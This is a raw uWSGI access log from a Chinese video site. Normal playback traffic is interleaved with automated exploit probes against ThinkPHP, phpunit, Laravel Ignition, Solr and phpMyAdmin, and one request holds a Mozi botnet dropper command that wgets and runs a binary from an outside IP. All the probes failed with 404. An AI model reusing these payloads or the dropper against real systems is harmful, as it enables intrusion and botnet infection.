[1621094401] ./uwsgi.log reopened.
[pid: 239510|app: 0|req: 233/377] 112.96.101.242 () {42 vars in 817 bytes} [Sun May 16 00:12:58 2021] GET /video/play/101098/2-11.html => generated 17428 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 234/378] 112.96.101.242 () {42 vars in 817 bytes} [Sun May 16 00:13:25 2021] GET /video/play/101098/2-11.html => generated 17428 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 235/379] 112.96.101.242 () {44 vars in 965 bytes} [Sun May 16 00:13:32 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 31288 bytes in 77 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 236/380] 112.96.101.242 () {44 vars in 916 bytes} [Sun May 16 00:13:42 2021] GET /video/play/bajie280118/ => generated 14153 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 237/381] 188.72.6.218 () {32 vars in 464 bytes} [Sun May 16 00:22:06 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 238/382] 45.155.205.181 () {38 vars in 612 bytes} [Sun May 16 00:31:08 2021] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 67/383] 45.155.205.181 () {38 vars in 714 bytes} [Sun May 16 00:31:09 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239512|app: 0|req: 34/384] 45.155.205.181 () {36 vars in 626 bytes} [Sun May 16 00:31:09 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239513|app: 0|req: 46/385] 45.155.205.181 () {34 vars in 722 bytes} [Sun May 16 00:31:10 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239513|app: 0|req: 47/386] 45.155.205.181 () {34 vars in 558 bytes} [Sun May 16 00:31:10 2021] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 239/387] 45.155.205.181 () {34 vars in 515 bytes} [Sun May 16 00:31:11 2021] GET /console/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 240/388] 45.155.205.181 () {34 vars in 558 bytes} [Sun May 16 00:31:11 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239511|app: 0|req: 68/389] 45.155.205.181 () {36 vars in 655 bytes} [Sun May 16 00:31:11 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239511|app: 0|req: 69/390] 45.155.205.181 () {38 vars in 638 bytes} [Sun May 16 00:31:12 2021] POST /Autodiscover/Autodiscover.xml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239512|app: 0|req: 35/391] 45.155.205.181 () {34 vars in 589 bytes} [Sun May 16 00:31:12 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239512|app: 0|req: 36/392] 45.155.205.181 () {36 vars in 604 bytes} [Sun May 16 00:31:15 2021] GET /_ignition/execute-solution => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 70/393] 118.113.236.142 () {36 vars in 662 bytes} [Sun May 16 00:40:28 2021] GET /phpmyadmin/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 241/394] 118.113.236.142 () {36 vars in 648 bytes} [Sun May 16 00:40:28 2021] GET /pmd/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239512|app: 0|req: 37/395] 118.113.236.142 () {36 vars in 672 bytes} [Sun May 16 00:40:28 2021] GET /phpmyadmin4.8.5/index.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 71/396] 117.136.32.80 () {42 vars in 808 bytes} [Sun May 16 00:43:53 2021] GET /video/play/bajie280118/ => generated 14153 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 242/397] 117.136.32.80 () {42 vars in 808 bytes} [Sun May 16 00:44:04 2021] GET /video/play/bajie280118/ => generated 14153 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 243/398] 117.136.32.80 () {42 vars in 816 bytes} [Sun May 16 00:44:14 2021] GET /video/play/101098/2-11.html => generated 17428 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 244/399] 78.142.35.7 () {40 vars in 671 bytes} [Sun May 16 02:01:31 2021] GET /config/getuser?index=0 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 245/400] 45.133.1.134 () {48 vars in 879 bytes} [Sun May 16 04:14:16 2021] POST /boaform/admin/formLogin => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 246/401] 118.126.124.141 () {38 vars in 613 bytes} [Sun May 16 04:30:28 2021] GET /?XDEBUG_SESSION_START%3Dphpstorm => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 247/402] 118.126.124.74 () {38 vars in 563 bytes} [Sun May 16 06:44:49 2021] GET /console/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 248/403] 180.149.125.175 () {34 vars in 493 bytes} [Sun May 16 07:50:21 2021] GET /c/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 249/404] 195.206.107.147 () {36 vars in 483 bytes} [Sun May 16 09:00:25 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 250/405] 183.27.45.49 () {44 vars in 880 bytes} [Sun May 16 09:16:42 2021] GET /video/play/101098/2-12.html => generated 17428 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 251/406] 51.158.86.70 () {38 vars in 495 bytes} [Sun May 16 10:14:08 2021] GET /phpMyAdmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239512|app: 0|req: 38/407] 51.158.86.70 () {38 vars in 495 bytes} [Sun May 16 10:14:08 2021] GET /phpmyadmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 252/408] 118.126.124.141 () {38 vars in 548 bytes} [Sun May 16 10:36:47 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 253/409] 218.13.14.227 () {44 vars in 881 bytes} [Sun May 16 10:50:49 2021] GET /video/play/101098/2-13.html => generated 17428 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 254/410] 181.231.11.175 () {32 vars in 466 bytes} [Sun May 16 11:03:11 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 255/411] 218.13.14.227 () {42 vars in 816 bytes} [Sun May 16 12:03:19 2021] GET /video/play/101098/2-13.html => generated 17428 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 256/412] 218.13.14.227 () {42 vars in 816 bytes} [Sun May 16 12:08:53 2021] GET /video/play/101098/2-13.html => generated 17428 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 257/413] 218.13.14.227 () {44 vars in 881 bytes} [Sun May 16 12:10:14 2021] GET /video/play/101098/2-13.html => generated 17428 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 258/414] 111.92.80.151 () {34 vars in 650 bytes} [Sun May 16 12:21:10 2021] GET /shell?cd+/tmp;rm+-rf+*;wget+http://111.92.80.151:36564/Mozi.a;chmod+777+Mozi.a;/tmp/Mozi.a+jaws => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 259/415] 35.204.86.138 () {34 vars in 385 bytes} [Sun May 16 12:49:39 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 260/416] 195.58.61.53 () {32 vars in 463 bytes} [Sun May 16 12:55:27 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 261/417] 218.13.14.227 () {44 vars in 881 bytes} [Sun May 16 12:58:50 2021] GET /video/play/101098/2-14.html => generated 17428 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 262/418] 47.107.59.178 () {40 vars in 632 bytes} [Sun May 16 13:52:16 2021] POST /_ignition/execute-solution => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239512|app: 0|req: 39/419] 47.107.59.178 () {38 vars in 727 bytes} [Sun May 16 13:52:16 2021] GET /?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=__HelloThinkPHP => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 263/420] 218.13.14.227 () {42 vars in 798 bytes} [Sun May 16 14:15:43 2021] GET /video/play/100864/ => generated 17165 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 264/421] 218.13.14.227 () {42 vars in 808 bytes} [Sun May 16 14:15:54 2021] GET /video/play/bajie273227/ => generated 18308 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 265/422] 218.13.14.227 () {44 vars in 955 bytes} [Sun May 16 14:16:45 2021] GET /video/search/?wd=%E5%90%8C%E4%B8%80%E5%B1%8B%E6%AA%90%E4%B8%8B&page=1 => generated 18509 bytes in 69 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 266/423] 218.13.14.227 () {44 vars in 915 bytes} [Sun May 16 14:16:55 2021] GET /video/play/bajie273216/ => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 267/424] 218.13.14.227 () {44 vars in 885 bytes} [Sun May 16 14:19:51 2021] GET /video/play/bajie273216/2-2.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 268/425] 218.13.14.227 () {44 vars in 893 bytes} [Sun May 16 14:19:54 2021] GET /video/play/bajie273216/2-1.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 269/426] 114.222.121.92 () {42 vars in 757 bytes} [Sun May 16 14:29:27 2021] GET /video/ => generated 63744 bytes in 285 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 270/427] 218.13.14.227 () {44 vars in 893 bytes} [Sun May 16 14:53:34 2021] GET /video/play/bajie273216/2-2.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 271/428] 118.126.124.74 () {38 vars in 592 bytes} [Sun May 16 15:11:11 2021] GET /video/play/101098/2-9.html => generated 17427 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 272/429] 218.13.14.227 () {44 vars in 893 bytes} [Sun May 16 15:25:21 2021] GET /video/play/bajie273216/2-3.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 273/430] 218.13.14.216 () {44 vars in 893 bytes} [Sun May 16 16:04:32 2021] GET /video/play/bajie273216/2-4.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 274/431] 162.218.65.10 () {34 vars in 438 bytes} [Sun May 16 16:24:49 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 275/432] 118.126.124.198 () {38 vars in 609 bytes} [Sun May 16 16:27:48 2021] GET /solr/admin/info/system?wt%3Djson => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 276/433] 218.13.14.216 () {44 vars in 893 bytes} [Sun May 16 16:43:45 2021] GET /video/play/bajie273216/2-5.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 277/434] 118.126.124.7 () {38 vars in 595 bytes} [Sun May 16 16:44:34 2021] GET /myadmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 278/435] 45.76.144.219 () {36 vars in 434 bytes} [Sun May 16 16:50:44 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 279/436] 118.126.124.7 () {38 vars in 591 bytes} [Sun May 16 16:55:18 2021] GET /video/play/101098/2-8.html => generated 17427 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 280/437] 118.126.124.7 () {38 vars in 542 bytes} [Sun May 16 17:16:32 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239512|app: 0|req: 40/438] 218.13.14.227 () {44 vars in 893 bytes} [Sun May 16 17:16:34 2021] GET /video/play/bajie273216/2-6.html => generated 15626 bytes in 18 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 281/439] 188.142.231.113 () {28 vars in 311 bytes} [Sun May 16 17:37:30 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 282/440] 218.13.14.227 () {44 vars in 893 bytes} [Sun May 16 18:06:33 2021] GET /video/play/bajie273216/2-7.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 283/441] 78.142.35.7 () {40 vars in 671 bytes} [Sun May 16 18:48:33 2021] GET /config/getuser?index=0 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 284/442] 206.189.111.32 () {36 vars in 487 bytes} [Sun May 16 18:53:35 2021] GET /_ignition/execute-solution => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 285/443] 162.142.125.54 () {28 vars in 313 bytes} [Sun May 16 19:34:45 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239513|app: 0|req: 48/444] 162.142.125.54 () {34 vars in 445 bytes} [Sun May 16 19:34:45 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 72/445] 80.82.76.26 () {34 vars in 393 bytes} [Sun May 16 19:34:54 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 286/446] 45.155.205.181 () {38 vars in 714 bytes} [Sun May 16 19:59:08 2021] POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239513|app: 0|req: 49/447] 45.155.205.181 () {38 vars in 612 bytes} [Sun May 16 19:59:08 2021] POST /api/jsonws/invoke => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 73/448] 45.155.205.181 () {36 vars in 626 bytes} [Sun May 16 19:59:09 2021] GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239512|app: 0|req: 41/449] 45.155.205.181 () {34 vars in 515 bytes} [Sun May 16 19:59:09 2021] GET /console/ => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239513|app: 0|req: 50/450] 45.155.205.181 () {36 vars in 655 bytes} [Sun May 16 19:59:09 2021] GET /?a=fetch&content=<php>die(@md5(HelloThinkCMF))</php> => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239513|app: 0|req: 51/451] 45.155.205.181 () {34 vars in 558 bytes} [Sun May 16 19:59:09 2021] GET /?XDEBUG_SESSION_START=phpstorm => generated 179 bytes in 0 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239513|app: 0|req: 52/452] 45.155.205.181 () {34 vars in 589 bytes} [Sun May 16 19:59:10 2021] GET /wp-content/plugins/wp-file-manager/readme.txt => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 287/453] 45.155.205.181 () {38 vars in 638 bytes} [Sun May 16 19:59:10 2021] POST /Autodiscover/Autodiscover.xml => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 288/454] 45.155.205.181 () {34 vars in 558 bytes} [Sun May 16 19:59:11 2021] GET /solr/admin/info/system?wt=json => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239512|app: 0|req: 42/455] 45.155.205.181 () {34 vars in 722 bytes} [Sun May 16 19:59:11 2021] GET /index.php?s=/Index/\think\app/invokefunction&function=call_user_func_array&vars[0]=md5&vars[1][]=HelloThinkPHP21 => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239512|app: 0|req: 43/456] 45.155.205.181 () {36 vars in 604 bytes} [Sun May 16 19:59:11 2021] GET /_ignition/execute-solution => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 289/457] 112.96.136.55 () {46 vars in 877 bytes} [Sun May 16 20:13:16 2021] GET /video/play/bajie273216/2-7.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 290/458] 112.96.136.55 () {44 vars in 893 bytes} [Sun May 16 20:14:49 2021] GET /video/play/bajie273216/2-8.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 291/459] 112.96.136.55 () {44 vars in 893 bytes} [Sun May 16 20:17:51 2021] GET /video/play/bajie273216/2-7.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 292/460] 112.96.136.55 () {44 vars in 893 bytes} [Sun May 16 20:17:52 2021] GET /video/play/bajie273216/2-8.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239512|app: 0|req: 44/461] 112.96.136.55 () {44 vars in 893 bytes} [Sun May 16 20:18:42 2021] GET /video/play/bajie273216/2-9.html => generated 15626 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 293/462] 112.96.136.55 () {44 vars in 893 bytes} [Sun May 16 20:18:43 2021] GET /video/play/bajie273216/2-8.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 294/463] 112.96.136.55 () {42 vars in 808 bytes} [Sun May 16 20:18:56 2021] GET /video/play/bajie280118/ => generated 14153 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239511|app: 0|req: 74/464] 112.96.136.55 () {42 vars in 808 bytes} [Sun May 16 20:19:02 2021] GET /video/play/bajie280118/ => generated 14153 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 295/465] 112.96.136.55 () {44 vars in 960 bytes} [Sun May 16 20:19:12 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 31288 bytes in 73 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 75/466] 112.96.136.55 () {44 vars in 893 bytes} [Sun May 16 20:19:43 2021] GET /video/play/bajie273216/2-7.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 296/467] 112.96.136.55 () {44 vars in 893 bytes} [Sun May 16 20:19:50 2021] GET /video/play/bajie273216/2-8.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 297/468] 182.50.64.152 () {32 vars in 465 bytes} [Sun May 16 20:43:07 2021] GET / => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 298/469] 218.13.14.227 () {44 vars in 893 bytes} [Sun May 16 20:48:53 2021] GET /video/play/bajie273216/2-9.html => generated 15626 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 299/470] 218.13.14.227 () {44 vars in 895 bytes} [Sun May 16 21:19:27 2021] GET /video/play/bajie273216/2-10.html => generated 15627 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 300/471] 218.13.14.227 () {44 vars in 896 bytes} [Sun May 16 21:41:13 2021] GET /video/play/bajie273216/2-11.html => generated 15627 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 301/472] 218.13.14.227 () {44 vars in 896 bytes} [Sun May 16 21:43:09 2021] GET /video/play/bajie273216/2-11.html => generated 15627 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 302/473] 218.13.14.227 () {44 vars in 896 bytes} [Sun May 16 21:43:18 2021] GET /video/play/bajie273216/2-10.html => generated 15627 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239511|app: 0|req: 76/474] 218.13.14.227 () {44 vars in 896 bytes} [Sun May 16 21:43:21 2021] GET /video/play/bajie273216/2-11.html => generated 15627 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239511|app: 0|req: 77/475] 218.13.14.227 () {44 vars in 896 bytes} [Sun May 16 21:44:07 2021] GET /video/play/bajie273216/2-11.html => generated 15627 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 303/476] 218.13.14.227 () {44 vars in 896 bytes} [Sun May 16 22:06:56 2021] GET /video/play/bajie273216/2-12.html => generated 15627 bytes in 6 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 304/477] 112.96.106.229 () {44 vars in 897 bytes} [Sun May 16 22:36:03 2021] GET /video/play/bajie273216/2-13.html => generated 15627 bytes in 5 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 305/478] 118.126.124.172 () {38 vars in 599 bytes} [Sun May 16 23:04:20 2021] GET /phpmyadmin/scripts/setup.php => generated 179 bytes in 1 msecs (HTTP/1.1 404) 5 headers in 158 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 306/479] 113.69.32.162 () {44 vars in 959 bytes} [Sun May 16 23:25:56 2021] GET /video/search/?wd=%E5%90%91%E5%BE%80%E7%9A%84%E7%94%9F%E6%B4%BB&page=1 => generated 31288 bytes in 70 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
[pid: 239510|app: 0|req: 307/480] 113.69.32.162 () {42 vars in 773 bytes} [Sun May 16 23:26:06 2021] GET /admin/ => generated 0 bytes in 11 msecs (HTTP/1.1 302) 7 headers in 210 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 308/481] 113.69.32.162 () {42 vars in 793 bytes} [Sun May 16 23:26:06 2021] GET /admin/login.html => generated 5722 bytes in 4 msecs (HTTP/1.1 200) 7 headers in 349 bytes (1 switches on core 0)
[pid: 239511|app: 0|req: 78/482] 113.69.32.162 () {50 vars in 1017 bytes} [Sun May 16 23:26:10 2021] POST /admin/login.html => generated 63 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 324 bytes (1 switches on core 0)
[pid: 239511|app: 0|req: 79/483] 113.69.32.162 () {44 vars in 871 bytes} [Sun May 16 23:26:10 2021] GET /admin/ => generated 30384 bytes in 7 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 309/484] 113.69.32.162 () {44 vars in 879 bytes} [Sun May 16 23:26:12 2021] GET /admin/view_log/ => generated 22395 bytes in 17 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 310/485] 113.69.32.162 () {44 vars in 870 bytes} [Sun May 16 23:26:24 2021] GET /admin/ => generated 30384 bytes in 3 msecs (HTTP/1.1 200) 7 headers in 350 bytes (1 switches on core 0)
--------2021-05-16 23:26:25 站点2开始更新--------
[pid: 239511|app: 0|req: 81/486] 113.69.32.162 () {44 vars in 883 bytes} [Sun May 16 23:26:28 2021] GET /admin/update_log/ => generated 19935 bytes in 46 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
[pid: 239510|app: 0|req: 311/487] 113.69.32.162 () {44 vars in 913 bytes} [Sun May 16 23:26:30 2021] GET /admin/update_log/?page=1208 => generated 18222 bytes in 25 msecs (HTTP/1.1 200) 6 headers in 182 bytes (1 switches on core 1)
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:26:34] [ERROR] page:146请求无数据，放入错误列表
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:26:34] [ERROR] page:150请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
[2021-05-16 23:26:35] [ERROR] page:147请求无数据，放入错误列表
proxy:  Status Code： 502 重试
get_json ERROR: list.remove(x): x not in list
Traceback (most recent call last):
  File "./video/func/getRequest.py", line 102, in get_json
    PROXYLIST.remove(proxy)
ValueError: list.remove(x): x not in list
None
